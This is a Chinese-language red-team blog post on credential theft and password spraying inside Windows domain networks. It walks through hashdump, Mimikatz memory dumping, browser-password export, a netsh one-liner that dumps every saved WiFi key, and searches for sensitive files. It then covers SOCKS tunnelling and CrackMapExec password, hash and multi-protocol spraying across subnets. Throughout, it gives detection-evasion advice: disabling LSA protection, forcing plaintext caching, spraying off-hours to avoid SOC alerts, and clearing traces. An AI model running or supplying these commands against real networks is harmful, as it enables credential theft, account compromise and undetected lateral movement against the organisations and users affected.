@@ -1,0 +1,309 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>内网凭证窃取 | kenny's blog</title><meta name="author" content="Kenny"><meta name="copyright" content="Kenny"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="f6f7f9"><meta name="description" content="内网凭证搜集在内网渗透中，凭证搜集是横向移动的关键环节。通过多维度的凭证获取，可以快速扩大攻击面，实现域内权限提升。以下是常见的凭证搜集手法。 主机密码抓取1. hashdump - 本地用户哈希导出通过读取 SAM 数据库获取本地用户的 NTLM 哈希值，适用于本地账户的离线破解或哈希传递攻击。  红队视角：hashdump 获取的是本地账户哈希，在工作组环境或本地管理员复用场景下价值较高。需要">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网凭证窃取">
+<meta property="og:url" content="https://www.52jl.top/2026/02/13/nw/index.html">
+<meta property="og:site_name" content="kenny&#39;s blog">
+<meta property="og:description" content="内网凭证搜集在内网渗透中，凭证搜集是横向移动的关键环节。通过多维度的凭证获取，可以快速扩大攻击面，实现域内权限提升。以下是常见的凭证搜集手法。 主机密码抓取1. hashdump - 本地用户哈希导出通过读取 SAM 数据库获取本地用户的 NTLM 哈希值，适用于本地账户的离线破解或哈希传递攻击。  红队视角：hashdump 获取的是本地账户哈希，在工作组环境或本地管理员复用场景下价值较高。需要">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.52jl.top/img/covers/shinchan-cover-06.webp">
+<meta property="article:published_time" content="2026-02-13T07:50:31.425Z">
+<meta property="article:modified_time" content="2026-02-13T07:50:31.426Z">
+<meta property="article:author" content="Kenny">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.52jl.top/img/covers/shinchan-cover-06.webp"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "内网凭证窃取",
+  "url": "https://www.52jl.top/2026/02/13/nw/",
+  "image": "https://www.52jl.top/img/covers/shinchan-cover-06.webp",
+  "datePublished": "2026-02-13T07:50:31.425Z",
+  "dateModified": "2026-02-13T07:50:31.426Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Kenny",
+      "url": "https://www.52jl.top"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://www.52jl.top/2026/02/13/nw/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: false,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '内网凭证窃取',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'post'
+}</script><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Noto+Sans+SC:wght@400;500;700&family=Noto+Serif+SC:wght@400;600;700&display=swap" rel="stylesheet"><link rel="stylesheet" href="/css/custom.css?v=20260213b"><meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noimageindex,max-snippet:0,max-image-preview:none,max-video-preview:0">
+<meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet">
+<script>
+(() => {
+  try {
+    const isAutomation = navigator.webdriver || /HeadlessChrome|PhantomJS|puppeteer|playwright/i.test(navigator.userAgent || '');
+    if (!isAutomation) return;
+    const selectors = ['#article-container', 'article', '.post-content', '.post-body'];
+    selectors.forEach((s) => {
+      document.querySelectorAll(s).forEach((el) => {
+        el.innerHTML = '<p>Content unavailable.</p>';
+      });
+    });
+  } catch (e) {}
+})();
+</script>
+<meta name="referrer" content="no-referrer">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self' https: data: blob:; script-src 'self' https: 'unsafe-inline' 'unsafe-eval'; style-src 'self' https: 'unsafe-inline'; img-src 'self' https: data: blob:; font-src 'self' https: data:; connect-src 'self' https:; object-src 'none'; base-uri 'self'; form-action 'self'; upgrade-insecure-requests">
+<script>
+(() => {
+  try {
+    if (window.top !== window.self) {
+      window.top.location = window.self.location.href;
+      return;
+    }
+
+    const host = window.location.hostname;
+    const isLocal = host === 'localhost' || host === '127.0.0.1';
+    if (!isLocal && window.location.protocol === 'http:') {
+      window.location.replace('https://' + window.location.host + window.location.pathname + window.location.search + window.location.hash);
+    }
+  } catch (e) {}
+})();
+</script>
+</head><body><div class="bg-animation" id="web_bg" style="background-color: #f6f7f9;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/ loading='lazy'></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">31</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-house-signal"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-box-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-tree"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-toolbox"></i><span> Tools</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/tools/url-extractor/"><i class="fa-fw fas fa-filter"></i><span> IP/域名/URL 提取</span></a></li><li><a class="site-page child" href="/tools/password-dict/"><i class="fa-fw fas fa-key"></i><span> 密码字典生成</span></a></li><li><a class="site-page child" href="/tools/av-detector/"><i class="fa-fw fas fa-shield-virus"></i><span> 杀软识别</span></a></li><li><a class="site-page child" href="/tools/shell-command/"><i class="fa-fw fas fa-terminal"></i><span> 命令编码工具</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img fixed" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">kenny's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">内网凭证窃取</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-house-signal"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-box-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-tree"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-toolbox"></i><span> Tools</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/tools/url-extractor/"><i class="fa-fw fas fa-filter"></i><span> IP/域名/URL 提取</span></a></li><li><a class="site-page child" href="/tools/password-dict/"><i class="fa-fw fas fa-key"></i><span> 密码字典生成</span></a></li><li><a class="site-page child" href="/tools/av-detector/"><i class="fa-fw fas fa-shield-virus"></i><span> 杀软识别</span></a></li><li><a class="site-page child" href="/tools/shell-command/"><i class="fa-fw fas fa-terminal"></i><span> 命令编码工具</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav></header><main class="layout hide-aside" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">内网凭证窃取</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-02-13T07:50:31.425Z" title="发表于 2026-02-13 15:50:31">2026-02-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-02-13T07:50:31.426Z" title="更新于 2026-02-13 15:50:31">2026-02-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/">红队攻防</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></span></div><div class="meta-secondline"></div></div></div><article class="container post-content" id="article-container"><h1 id="内网凭证搜集"><a href="#内网凭证搜集" class="headerlink" title="内网凭证搜集"></a>内网凭证搜集</h1><p>在内网渗透中，凭证搜集是横向移动的关键环节。通过多维度的凭证获取，可以快速扩大攻击面，实现域内权限提升。以下是常见的凭证搜集手法。</p>
+<h2 id="主机密码抓取"><a href="#主机密码抓取" class="headerlink" title="主机密码抓取"></a>主机密码抓取</h2><h3 id="1-hashdump-本地用户哈希导出"><a href="#1-hashdump-本地用户哈希导出" class="headerlink" title="1. hashdump - 本地用户哈希导出"></a>1. hashdump - 本地用户哈希导出</h3><p>通过读取 SAM 数据库获取本地用户的 NTLM 哈希值，适用于本地账户的离线破解或哈希传递攻击。</p>
+<p><img src="/2026/02/13/nw/1.webp" loading='lazy'></p>
+<p><strong>红队视角</strong>：hashdump 获取的是本地账户哈希，在工作组环境或本地管理员复用场景下价值较高。需要注意的是，Windows 10 及以上版本默认禁用了 Administrator 账户，实战中更多关注自定义的本地管理员账户。</p>
+<h3 id="2-logonpasswords-内存明文凭证"><a href="#2-logonpasswords-内存明文凭证" class="headerlink" title="2. logonpasswords - 内存明文凭证"></a>2. logonpasswords - 内存明文凭证</h3><p>利用 Mimikatz 等工具从 lsass.exe 进程内存中提取明文密码、哈希、Kerberos 票据等凭证信息。</p>
+<p><img src="/2026/02/13/nw/2.webp" loading='lazy'></p>
+<p>这里可以看到系统中曾经登录过的用户凭证信息，包括域账户和本地账户。</p>
+<p><img src="/2026/02/13/nw/3.webp" loading='lazy'></p>
+<p><strong>红队视角</strong>：logonpasswords 是内网渗透的核心技术，但需要 SYSTEM 或管理员权限。Windows Server 2012 R2 及以上版本默认启用了 LSA 保护，需要先关闭保护或使用驱动级工具绕过。此外，注意 wdigest 在 Windows 8.1&#x2F;2012 R2 后默认不缓存明文，可通过修改注册表强制开启后等待用户重新登录。</p>
+<h2 id="浏览器存储密码"><a href="#浏览器存储密码" class="headerlink" title="浏览器存储密码"></a>浏览器存储密码</h2><p>现代浏览器会保存用户的登录凭证，这些凭证通常以加密形式存储在本地数据库中。通过专用工具可以批量导出。</p>
+<p>推荐工具：<a target="_blank" rel="noopener" href="https://github.com/moonD4rk/HackBrowserData">HackBrowserData</a></p>
+<p>该工具支持主流浏览器（Chrome、Edge、Firefox 等）的密码、Cookie、书签、历史记录导出。</p>
+<p><strong>替代方案</strong>：使用 Cobalt Strike 插件（如 BrowserGhost）可以在 Beacon 会话中直接提取，无需上传额外工具。</p>
+<p><strong>红队视角</strong>：浏览器密码往往包含 VPN、内部系统、云平台等高价值凭证。建议优先提取 Cookie 而非密码，因为 Cookie 可以直接劫持会话，绕过 MFA 双因素认证。注意部分企业会部署 EDR 监控浏览器数据库访问行为。</p>
+<h2 id="WiFi-密码提取"><a href="#WiFi-密码提取" class="headerlink" title="WiFi 密码提取"></a>WiFi 密码提取</h2><p>Windows 系统会明文存储曾经连接过的 WiFi 密码，可通过 netsh 命令直接读取。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出所有连接过的 WiFi 配置文件</span></span><br><span class="line">netsh wlan show profiles</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看指定 WiFi 的详细配置（包括明文密码）</span></span><br><span class="line">netsh wlan show profiles name=<span class="string">&quot;XSZXJY_5G&quot;</span> key=clear</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一键导出所有 WiFi 密码到文件</span></span><br><span class="line"><span class="keyword">for</span> /f <span class="string">&quot;skip=9 tokens=1,2 delims=:&quot;</span> %i <span class="keyword">in</span> (<span class="string">&#x27;netsh wlan show profiles&#x27;</span>) <span class="keyword">do</span> @<span class="built_in">echo</span> %j | findstr -i -v <span class="built_in">echo</span> | netsh wlan show profiles %j key=clear &gt; wifipass.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>红队视角</strong>：WiFi 密码在物理渗透或社会工程学场景中价值较高，可用于后续的无线网络接入。部分企业的 WiFi 密码与域账户密码存在关联性（如统一密码策略），可作为密码喷洒的字典来源。</p>
+<h2 id="敏感文档搜索"><a href="#敏感文档搜索" class="headerlink" title="敏感文档搜索"></a>敏感文档搜索</h2><p>通过文件搜索定位可能包含凭证信息的敏感文档（如配置文件、密码表格等）。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 搜索 C 盘所有 Excel 文件</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b c:\*.xls</span><br><span class="line"><span class="built_in">dir</span> /a /s /b c:\*.xlsx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索 C 盘所有 Word 文档</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b c:\*.doc</span><br><span class="line"><span class="built_in">dir</span> /a /s /b c:\*.docx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索 D 盘文档</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\*.xls</span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\*.doc</span><br></pre></td></tr></table></figure>
+
+<p><strong>红队视角</strong>：除了 Office 文档，还应关注以下高价值文件：</p>
+<ul>
+<li>配置文件：<code>*.conf</code>、<code>*.ini</code>、<code>*.xml</code>、<code>*.yaml</code></li>
+<li>脚本文件：<code>*.bat</code>、<code>*.ps1</code>、<code>*.vbs</code>（常含硬编码凭证）</li>
+<li>数据库文件：<code>*.mdb</code>、<code>*.accdb</code>、<code>*.db</code></li>
+<li>备份文件：<code>*.bak</code>、<code>*.old</code>、<code>*.backup</code></li>
+<li>密钥文件：<code>*.key</code>、<code>*.pem</code>、<code>id_rsa</code></li>
+</ul>
+<p>建议使用关键词搜索（如 <code>password</code>、<code>pwd</code>、<code>账号</code>、<code>凭证</code>）结合文件类型过滤，提高效率。</p>
+<h2 id="自动化凭证搜集"><a href="#自动化凭证搜集" class="headerlink" title="自动化凭证搜集"></a>自动化凭证搜集</h2><p>对于批量凭证搜集，推荐使用 Cobalt Strike 插件集成化操作，避免频繁上传工具触发告警。</p>
+<p><img src="/2026/02/13/nw/4.webp" loading='lazy'></p>
+<p><strong>红队视角</strong>：自动化工具虽然高效，但容易产生大量日志和网络流量。实战中建议：</p>
+<ol>
+<li>优先使用内存执行（execute-assembly）而非落地文件</li>
+<li>分时段执行，避免短时间大量操作</li>
+<li>关注 EDR 对 lsass.exe 访问的监控，必要时使用间接读取技术</li>
+<li>及时清理痕迹（如导出的文件、临时目录）</li>
+</ol>
+<h1 id="凭证喷洒"><a href="#凭证喷洒" class="headerlink" title="凭证喷洒"></a>凭证喷洒</h1><p>凭证喷洒（Password Spraying）是一种低频高覆盖的横向移动技术，通过使用少量高频密码对大量账户进行尝试，在不触发账户锁定策略的前提下，批量验证凭证有效性。</p>
+<h2 id="搭建代理隧道"><a href="#搭建代理隧道" class="headerlink" title="搭建代理隧道"></a>搭建代理隧道</h2><p>获取目标主机权限后，需要通过 SOCKS 代理隧道将内网流量转发到攻击机，以便使用本地工具直接访问内网资源。</p>
+<p><img src="/2026/02/13/nw/5.webp" loading='lazy'></p>
+<p><strong>红队视角</strong>：隧道搭建是内网渗透的基础设施，常用方案包括：</p>
+<ul>
+<li><strong>Cobalt Strike</strong>：使用 <code>socks</code> 命令快速建立 SOCKS4a 代理</li>
+<li><strong>Metasploit</strong>：<code>auxiliary/server/socks_proxy</code> 模块</li>
+<li><strong>第三方工具</strong>：frp、nps、chisel、ligolo-ng 等</li>
+</ul>
+<p>选择隧道工具时需考虑：流量特征、稳定性、多级代理支持、是否需要落地文件。</p>
+<h2 id="配置代理链"><a href="#配置代理链" class="headerlink" title="配置代理链"></a>配置代理链</h2><p>修改 proxychains4 配置文件 <code>/etc/proxychains4.conf</code>，添加 SOCKS 代理地址。</p>
+<p><img src="/2026/02/13/nw/6.webp" loading='lazy'></p>
+<p><strong>配置示例</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在配置文件末尾添加</span></span><br><span class="line">socks4  127.0.0.1  1080</span><br></pre></td></tr></table></figure>
+
+<p><strong>安装 CrackMapExec</strong>（内网批量验证神器）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update &amp;&amp; <span class="built_in">sudo</span> apt install crackmapexec -y</span><br></pre></td></tr></table></figure>
+
+<p><strong>红队视角</strong>：proxychains 存在 DNS 泄漏风险，建议使用 <code>proxychains4 -q</code>（安静模式）减少日志输出。对于大规模扫描，推荐使用 <code>proxychains-ng</code> 或直接在跳板机上执行，避免代理链的性能损耗。</p>
+<h2 id="喷洒前置条件检查"><a href="#喷洒前置条件检查" class="headerlink" title="喷洒前置条件检查"></a>喷洒前置条件检查</h2><p>域环境通常配置了账户锁定策略，必须在喷洒前获取策略参数，避免大规模锁定账户导致安全事件。</p>
+<p><strong>查询域密码策略</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains crackmapexec smb 192.168.3.142 -u <span class="string">&quot;用户名&quot;</span> -p <span class="string">&quot;密码&quot;</span> --pass-pol</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/13/nw/9.webp" loading='lazy'></p>
+<p><strong>关键参数解读</strong>：</p>
+<ul>
+<li><p><strong>账号锁定阈值（Lockout Threshold）</strong>：<code>none</code> 表示无限制，数字表示允许的最大失败次数</p>
+</li>
+<li><p><strong>账号锁定时间（Lockout Duration）</strong>：账户被锁定后的持续时间（如 30 分钟）</p>
+</li>
+<li><p><strong>重置计数器时间（Reset Counter）</strong>：失败计数器的重置周期</p>
+</li>
+<li><p>如果锁定阈值为 <code>none</code>，可以放心进行密码喷洒</p>
+</li>
+<li><p>如果有次数限制（如 5 次），密码字典应 <strong>严格小于该值</strong>（建议 3-4 个密码）</p>
+</li>
+<li><p>喷洒间隔应 <strong>大于重置计数器时间</strong>，避免累积失败次数</p>
+</li>
+<li><p>优先测试 <strong>已禁用账户</strong> 或 <strong>服务账户</strong>（通常不受锁定策略限制）</p>
+</li>
+<li><p>避开工作时间进行喷洒，减少用户感知和 SOC 告警</p>
+</li>
+</ul>
+<h2 id="密码喷洒（已知用户名）"><a href="#密码喷洒（已知用户名）" class="headerlink" title="密码喷洒（已知用户名）"></a>密码喷洒（已知用户名）</h2><p>使用单个或多个密码对已知用户进行批量验证，适用于获取了用户列表但不确定密码的场景。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 单用户 + 密码字典</span></span><br><span class="line">proxychains -q crackmapexec smb 192.168.86.0/24 -u <span class="string">&#x27;administrator&#x27;</span> -P ./password.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 多用户 + 单密码（经典喷洒）</span></span><br><span class="line">proxychains -q crackmapexec smb 192.168.86.0/24 -u users.txt -p <span class="string">&#x27;Admin@123&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/13/nw/7.webp" loading='lazy'></p>
+<ul>
+<li>密码字典应基于 <strong>目标企业特征</strong> 构造（如公司名+年份、季节+特殊字符）</li>
+<li>常见弱密码：<code>Admin@123</code>、<code>P@ssw0rd</code>、<code>公司名2024</code>、<code>Aa123456</code></li>
+<li>关注输出中的 <code>[+] Pwn3d!</code> 标识，表示该凭证具有管理员权限</li>
+</ul>
+<h2 id="哈希喷洒（Pass-the-Hash）"><a href="#哈希喷洒（Pass-the-Hash）" class="headerlink" title="哈希喷洒（Pass-the-Hash）"></a>哈希喷洒（Pass-the-Hash）</h2><p>在无法获取明文密码的情况下，直接使用 NTLM 哈希进行身份验证，无需破解哈希值。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 单哈希喷洒整个网段</span></span><br><span class="line">proxychains -q crackmapexec smb 192.168.86.0/24 -u <span class="string">&#x27;administrator&#x27;</span> -H <span class="string">&#x27;1234567890abcdef1234567890abcdef&#x27;</span> -t 10</span><br><span class="line"></span><br><span class="line"><span class="comment"># 批量哈希验证（哈希文件格式：每行一个哈希）</span></span><br><span class="line">proxychains -q crackmapexec smb 192.168.86.0/24 -H ./hashes.txt -t 10</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/13/nw/8.webp" loading='lazy'></p>
+<ul>
+<li>NTLM 哈希格式为 32 位十六进制字符串（如 <code>aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0</code>）</li>
+<li>如果只有 NT 哈希，可以用空 LM 哈希填充：<code>aad3b435b51404eeaad3b435b51404ee:NT哈希</code></li>
+<li>哈希传递攻击不受密码复杂度策略限制，是内网横向的核心技术</li>
+<li>注意 Windows 10&#x2F;Server 2016 后默认禁用了本地管理员的远程哈希传递（KB2871997）</li>
+</ul>
+<h2 id="主机喷洒（已知凭证）"><a href="#主机喷洒（已知凭证）" class="headerlink" title="主机喷洒（已知凭证）"></a>主机喷洒（已知凭证）</h2><p>使用已验证的凭证对整个网段进行批量测试，快速定位凭证复用的主机。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains -q crackmapexec smb 192.168.3.0/24 -u <span class="string">&quot;sqlsvr&quot;</span> -p <span class="string">&quot;Admin12345&quot;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>本地管理员密码复用是内网渗透的常见突破口</li>
+<li>关注输出中的 <code>(Pwn3d!)</code> 标识，表示可以直接执行命令</li>
+<li>结合 <code>--shares</code> 参数枚举共享目录，寻找敏感文件</li>
+</ul>
+<h2 id="用户喷洒（已知密码）"><a href="#用户喷洒（已知密码）" class="headerlink" title="用户喷洒（已知密码）"></a>用户喷洒（已知密码）</h2><p>使用单个高频密码对用户列表进行批量验证，适用于密码策略较弱的环境。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains -q crackmapexec smb 192.168.3.142 -u users.txt -p <span class="string">&#x27;Admin12345&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>用户列表可通过以下方式获取：<ul>
+<li>LDAP 枚举：<code>ldapsearch</code>、<code>windapsearch</code></li>
+<li>RID 循环：<code>crackmapexec smb &lt;target&gt; --rid-brute</code></li>
+<li>Kerberos 用户枚举：<code>kerbrute</code></li>
+<li>公开信息：企业邮箱格式、LinkedIn 员工列表</li>
+</ul>
+</li>
+</ul>
+<h2 id="服务喷洒（多协议验证）"><a href="#服务喷洒（多协议验证）" class="headerlink" title="服务喷洒（多协议验证）"></a>服务喷洒（多协议验证）</h2><p>对不同服务协议进行凭证验证，扩大攻击面。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># MSSQL 数据库</span></span><br><span class="line">proxychains -q cme mssql 192.168.3.0/24 -u sa -p <span class="string">&#x27;admin&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># RDP 远程桌面</span></span><br><span class="line">proxychains -q cme rdp 192.168.3.0/24 -u administrator -p <span class="string">&#x27;admin&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SSH 服务</span></span><br><span class="line">proxychains -q cme ssh 192.168.3.0/24 -u root -p <span class="string">&#x27;admin&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># LDAP 域服务（支持明文和哈希）</span></span><br><span class="line">proxychains -q cme ldap 192.168.1.0/24 -u user -p password</span><br><span class="line">proxychains -q cme ldap 192.168.1.0/24 -u user -H A29F7623FD11550DEF0192DE9246F46B</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>MSSQL</strong>：默认 sa 账户是高价值目标，成功后可通过 xp_cmdshell 执行命令</li>
+<li><strong>RDP</strong>：验证成功不代表可以登录，需关注 NLA（网络级别身份验证）和 RDP 限制策略</li>
+<li><strong>SSH</strong>：Linux 服务器的密钥认证优先级高于密码，注意 <code>/etc/ssh/sshd_config</code> 配置</li>
+<li><strong>LDAP</strong>：可用于验证域凭证有效性，避免直接 SMB 登录产生大量日志</li>
+</ul>
+<p><strong>喷洒策略总结</strong>：</p>
+<ol>
+<li><strong>低频慢速</strong>：每个账户尝试 1-3 个密码，间隔 30-60 分钟</li>
+<li><strong>时间选择</strong>：避开上班高峰期（9-11 点），选择午休或下班后</li>
+<li><strong>目标筛选</strong>：优先测试服务账户、已禁用账户、长期未登录账户</li>
+<li><strong>日志规避</strong>：使用 Kerberos 预认证（AS-REP）代替 NTLM，减少事件日志</li>
+<li><strong>应急预案</strong>：准备账户解锁脚本，避免大规模锁定引发安全事件</li>
+</ol>
